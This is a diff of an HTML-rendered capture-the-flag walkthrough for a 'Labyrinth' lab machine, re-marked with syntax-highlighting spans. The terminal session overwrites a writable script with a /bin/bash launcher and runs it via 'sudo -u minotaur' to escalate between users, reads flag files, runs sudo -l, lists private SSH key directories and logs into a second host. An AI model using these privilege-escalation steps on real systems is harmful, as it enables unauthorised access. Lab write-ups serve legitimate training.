+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="o">-</span><span class="n">rwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">02</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span>
 
-echo '#!/bin/bash' &gt; /home/entrance/labyrinth
-echo &quot;/bin/bash&quot; &gt;&gt; /home/entrance/labyrinth
-echo '/bin/bash' &gt;&gt; /home/entrance/labyrinth
+<span class="n">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">echo</span><span class="w"> </span><span class="ss">&quot;/bin/bash&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">echo</span><span class="w"> </span><span class="s1">&#39;/bin/bash&#39;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
 
-chmod +x /home/entrance/labyrinth
-sudo -u minotaur /home/entrance/labyrinth
+<span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
 
-echo -e '#!/bin/bash\n/bin/bash' &gt; /home/entrance/labyrinth
-chmod +x /home/entrance/labyrinth
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
 
-sudo -u minotaur /home/entrance/labyrinth
-id
+<span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">id</span>
 
-entrance@Labyrinth:/home$ sudo -u minotaur /home/entrance/labyrinth
-minotaur@Labyrinth:/home$ id
-uid=1002(minotaur) gid=1002(minotaur) groups=1002(minotaur)
-minotaur@Labyrinth:/home$ ls
-ariadne  entrance  minotaur
-minotaur@Labyrinth:/home$ cd minotaur
-minotaur@Labyrinth:/home/minotaur$ ls
-Labyrinth_Flag  Minotaur  ariadne  thread
-minotaur@Labyrinth:/home/minotaur$ cat Labyrinth_Flag
+<span class="n">entrance</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">minotaur</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">minotaur</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">minotaur</span><span class="p">)</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">ariadne</span><span class="w">  </span><span class="n">entrance</span><span class="w">  </span><span class="n">minotaur</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">minotaur</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">Labyrinth_Flag</span><span class="w">  </span><span class="n">Minotaur</span><span class="w">  </span><span class="n">ariadne</span><span class="w">  </span><span class="n">thread</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">Labyrinth_Flag</span>
 
 
-minotaur@Labyrinth:/home/minotaur$ sudo -l
-Matching Defaults entries for minotaur on Labyrinth:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">Labyrinth</span><span class="p">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span>
+<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
 
-User minotaur may run the following commands on Labyrinth:
-    (ariadne) NOPASSWD: /home/minotaur/thread
-minotaur@Labyrinth:/home/minotaur$ cd /home/minotaur/
-minotaur@Labyrinth:/home/minotaur$ ls -la
-total 18
-drwxr-xr-x 5 minotaur minotaur   13 Aug 20  2020 .
-drwxr-xr-x 5 root     root        5 Aug  3  2020 ..
-lrwxrwxrwx 1 root     root        9 Aug  3  2020 .bash_history -&gt; /dev/null
--rw-r--r-- 1 minotaur minotaur  220 Aug  3  2020 .bash_logout
--rw-r--r-- 1 minotaur minotaur 3771 Aug  3  2020 .bashrc
-drwx------ 3 minotaur minotaur    3 Aug  3  2020 .gnupg
-drwxrwxr-x 3 minotaur minotaur    3 Aug  3  2020 .local
--rw-r--r-- 1 minotaur minotaur  807 Aug  3  2020 .profile
-drwx------ 2 minotaur minotaur    5 Aug  4  2020 .ssh
--rwxr----- 1 minotaur minotaur   38 Aug  3  2020 Labyrinth_Flag
--rwxr----- 1 minotaur minotaur 1445 Aug 20  2020 Minotaur
--rwxr----- 1 ariadne  ariadne    37 Aug  4  2020 ariadne
--rwxr-xr-x 1 minotaur minotaur 8688 Aug  4  2020 thread
-minotaur@Labyrinth:/home/minotaur$ file thread
-thread: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66742fe34842823ac968336a34a14a63d5e6df5f, not stripped
-minotaur@Labyrinth:/home/minotaur$
-</code></pre>
+<span class="k">User</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">Labyrinth</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">ariadne</span><span class="p">)</span><span class="w"> </span><span class="nl">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="o">/</span><span class="n">thread</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="o">/</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">18</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">   </span><span class="mi">13</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">        </span><span class="mi">5</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">..</span>
+<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">        </span><span class="mi">9</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="mi">3771</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">    </span><span class="mi">3</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">gnupg</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">    </span><span class="mi">3</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="k">local</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">  </span><span class="mi">807</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">    </span><span class="mi">5</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">4</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w">   </span><span class="mi">38</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">Labyrinth_Flag</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="mi">1445</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">Minotaur</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ariadne</span><span class="w">  </span><span class="n">ariadne</span><span class="w">    </span><span class="mi">37</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">4</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">ariadne</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="n">minotaur</span><span class="w"> </span><span class="mi">8688</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">4</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="n">thread</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">thread</span>
+<span class="nl">thread</span><span class="p">:</span><span class="w"> </span><span class="n">ELF</span><span class="w"> </span><span class="mi">64</span><span class="o">-</span><span class="nc">bit</span><span class="w"> </span><span class="n">LSB</span><span class="w"> </span><span class="n">executable</span><span class="p">,</span><span class="w"> </span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">SYSV</span><span class="p">),</span><span class="w"> </span><span class="n">dynamically</span><span class="w"> </span><span class="n">linked</span><span class="p">,</span><span class="w"> </span><span class="n">interpreter</span><span class="w"> </span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">3.2.0</span><span class="p">,</span><span class="w"> </span><span class="n">BuildID</span><span class="o">[</span><span class="n">sha1</span><span class="o">]=</span><span class="mi">66742</span><span class="n">fe34842823ac968336a34a14a63d5e6df5f</span><span class="p">,</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">stripped</span>
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>Minotaur_Flag  TheReturn  ariadne  final.jpg  jpeg_body.bin  jpeg_header.bin
-ariadne@Labyrinth:/home/ariadne$ ssh Shore@10.71.235.37
-The authenticity of host '10.71.235.37 (10.71.235.37)' can't be established.
-ECDSA key fingerprint is SHA256:LVTZvTVUM/c+/qVDbAvdKwSUcs5oCl+QCjMArUiYhAQ.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.71.235.37' (ECDSA) to the list of known hosts.
-Shore@10.71.235.37's password: 
+<div class="codehilite"><pre><span></span><code><span class="n">Minotaur_Flag</span><span class="w">  </span><span class="n">TheReturn</span><span class="w">  </span><span class="n">ariadne</span><span class="w">  </span><span class="n">final</span><span class="p">.</span><span class="n">jpg</span><span class="w">  </span><span class="n">jpeg_body</span><span class="p">.</span><span class="n">bin</span><span class="w">  </span><span class="n">jpeg_header</span><span class="p">.</span><span class="n">bin</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">Shore</span><span class="mf">@10.71.235.37</span>
+<span class="n">The</span><span class="w"> </span><span class="n">authenticity</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="err">&#39;</span><span class="mf">10.71.235.37</span><span class="w"> </span><span class="p">(</span><span class="mf">10.71.235.37</span><span class="p">)</span><span class="err">&#39;</span><span class="w"> </span><span class="n">can</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">established</span><span class="p">.</span>
+<span class="n">ECDSA</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">SHA256</span><span class="o">:</span><span class="n">LVTZvTVUM</span><span class="o">/</span><span class="n">c</span><span class="o">+/</span><span class="n">qVDbAvdKwSUcs5oCl</span><span class="o">+</span><span class="n">QCjMArUiYhAQ</span><span class="p">.</span>
+<span class="n">Are</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="n">connecting</span><span class="w"> </span><span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="p">)</span><span class="o">?</span><span class="w"> </span><span class="n">yes</span>
+<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Permanently</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="err">&#39;</span><span class="mf">10.71.235.37</span><span class="err">&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">hosts</span><span class="p">.</span>
+<span class="n">Shore</span><span class="mf">@10.71.235.37</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
 
-Permission denied, please try again.
-Shore@10.71.235.37's password: 
+<span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">try</span><span class="w"> </span><span class="n">again</span><span class="p">.</span>
+<span class="n">Shore</span><span class="mf">@10.71.235.37</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
 
-Permission denied, please try again.
-Shore@10.71.235.37's password: 
+<span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">try</span><span class="w"> </span><span class="n">again</span><span class="p">.</span>
+<span class="n">Shore</span><span class="mf">@10.71.235.37</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
 
-Shore@10.71.235.37: Permission denied (publickey,password).
-ariadne@Labyrinth:/home/ariadne$ 
-ariadne@Labyrinth:/home/ariadne$ cd ..
-ariadne@Labyrinth:/home$ ls
-ariadne  entrance  minotaur
-ariadne@Labyrinth:/home$ ls -la
-total 7
-drwxr-xr-x  5 root     root      5 Aug  3  2020 .
-drwxr-xr-x 22 root     root     22 Jul 29  2020 ..
-drwxr-xr-x  4 ariadne  ariadne  14 Jan  1 03:26 ariadne
-drwxr-xr-x  5 entrance entrance 13 Jan  1 02:40 entrance
-drwxr-xr-x  5 minotaur minotaur 14 Jan  1 03:14 minotaur
-ariadne@Labyrinth:/home$ cd ariadne
-ariadne@Labyrinth:/home/ariadne$ ls -la
-total 102
-drwxr-xr-x 4 ariadne ariadne    14 Jan  1 03:26 .
-drwxr-xr-x 5 root    root        5 Aug  3  2020 ..
-lrwxrwxrwx 1 root    root        9 Aug  3  2020 .bash_history -&gt; /dev/null
--rw-r--r-- 1 ariadne ariadne   220 Aug  3  2020 .bash_logout
--rw-r--r-- 1 ariadne ariadne  3771 Aug  3  2020 .bashrc
-drwx------ 3 ariadne ariadne     3 Aug  3  2020 .gnupg
--rw-r--r-- 1 ariadne ariadne   807 Aug  3  2020 .profile
-drwx------ 2 ariadne ariadne     5 Aug  4  2020 .ssh
--rwxr----- 1 ariadne ariadne    38 Aug  3  2020 Minotaur_Flag
--rwxr----- 1 ariadne ariadne   689 Aug 20  2020 TheReturn
--rw-r--r-- 1 ariadne ariadne 29720 Aug 20  2020 ariadne
--rw-r--r-- 1 ariadne ariadne 29720 Jan  1 03:26 final.jpg
--rw-r--r-- 1 ariadne ariadne 29700 Jan  1 03:26 jpeg_body.bin
--rw-r--r-- 1 ariadne ariadne    20 Jan  1 03:26 jpeg_header.bin
-ariadne@Labyrinth:/home/ariadne$ cd .ssh
-ariadne@Labyrinth:/home/ariadne/.ssh$ ls -la
-total 7
-drwx------ 2 ariadne ariadne    5 Aug  4  2020 .
-drwxr-xr-x 4 ariadne ariadne   14 Jan  1 03:26 ..
--rw------- 1 ariadne ariadne 1679 Aug  3  2020 id_rsa
--rw------- 1 ariadne ariadne  399 Aug  3  2020 id_rsa.pub
--rw-r--r-- 1 ariadne ariadne  444 Jan  1 03:33 known_hosts
-ariadne@Labyrinth:/home/ariadne/.ssh$ cat known_hosts
-|1|R88uaNRrE9cqD0Ou2KdWXzayG6E=|PBesDIm0gzmr9n3WJrGtY0Rsofg= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=
-|1|opaMgWGBGwKAYZhnX4pM2JMA+Ck=|bMPoqMpe3qzGgWONOmrWs09HWNI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGy/yjIbzS3kTHnzuzS7lbDjQAOpQDYw7883aFvYqH1q32nBci9bPAoJ1TwXaqhSu+B7oRChOQzlbDs9hk4SNsw=
-ariadne@Labyrinth:/home/ariadne/.ssh$  ssh shore@10.71.235.37
-shore@10.71.235.37's password: 
-#############################################################################
-#(@@@@)                    (#########)                   (@@@@@@@@(@@@@@@@@@#
-#@@@@@@)___                 (####)~~~   /\                ~~(@@@@@@@(@@@@@@@#
-#@@@@@@@@@@)                 ~~~~      /::~-__               ~~~(@@@@@@@@)~~#
-#@@@)~~~~~~                           /::::::/\                  ~~(@@@@)   #
-#~~~                              O  /::::::/::~--,                 ~~~~    #
-#                                 | /:::::/::::::/{                         #
-#                 |\              |/::::/::::::/:::|                        #
-#                |:/~\           ||:::/:::::/::::::|                        #
-#               |,/:::\          ||/'::: /::::::::::|                       #
-#              |#__--~~\        |'#::,,/::::::::: __|   ,,'`,               #
-#             |__# :::::\       |-#&quot;&quot;:::::::__--~~::| ,'     ',     ,,      #
-#,    ,,     |____#~~~--\,'',.  |_#____---~~:::::::::|         ',','  ',    #
-# '.,'  '.,,'|::::##~~~--\    `,||#|::::::_____----~~~|         ,,,     '.''#
-#____________'----###__:::\_____||#|--~~~~::::: ____--~______,,''___________#
-#^^^  ^^^^^   |#######\~~~^^O, | ### __-----~~~~_____########'  ^^^^  ^^^   #
-#,^^^^^','^^^^,|#########\_||\__O###~_######___###########;' ^^^^  ^^^   ^^ #
-#^^/\/^^^^/\/\^^|#######################################;'/\/\/^^^/\/^^^/\/^#
-#   /\/\/\/\/\  /\|####################################'      /\/\/\/\/\    #
-#\/\/\     /\/\/\  /\/\/\/\    /\/\/\/\/\   /\/\/\    /\/\/\/\      /\/\/\/\#
-#spb\/\/\    /\/\/\/\    /\/\/\/\    /\/\/\/\   /\/\/\/\    /\/\/\/\/\      #
-#############################################################################
-shore@Athens:~$ ls
-Athens_flag  BlackSails
-shore@Athens:~$ cat Athens_flag
- ____ ____ ____ ____ ____ ____ ____ 
-||T |||h |||e |||s |||e |||u |||s ||
-||__|||__|||__|||__|||__|||__|||__||
-|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
+<span class="n">Shore</span><span class="mf">@10.71.235.37</span><span class="o">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="p">(</span><span class="n">publickey</span><span class="p">,</span><span class="n">password</span><span class="p">).</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne$</span><span class="w"> </span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">ariadne$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">..</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">ariadne</span><span class="w">  </span><span class="n">entrance</span><span class="w">  </span><span class="n">minotaur</span>
+<span class="n">ariadne</span><span class="p">@</span><span class="n">Labyrinth</span><span class="o">:/</span><span class="n">home$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">7</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">      </span><span class="mi">5</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="mi">3</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">     </span><span class="mi">22</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">..</span>
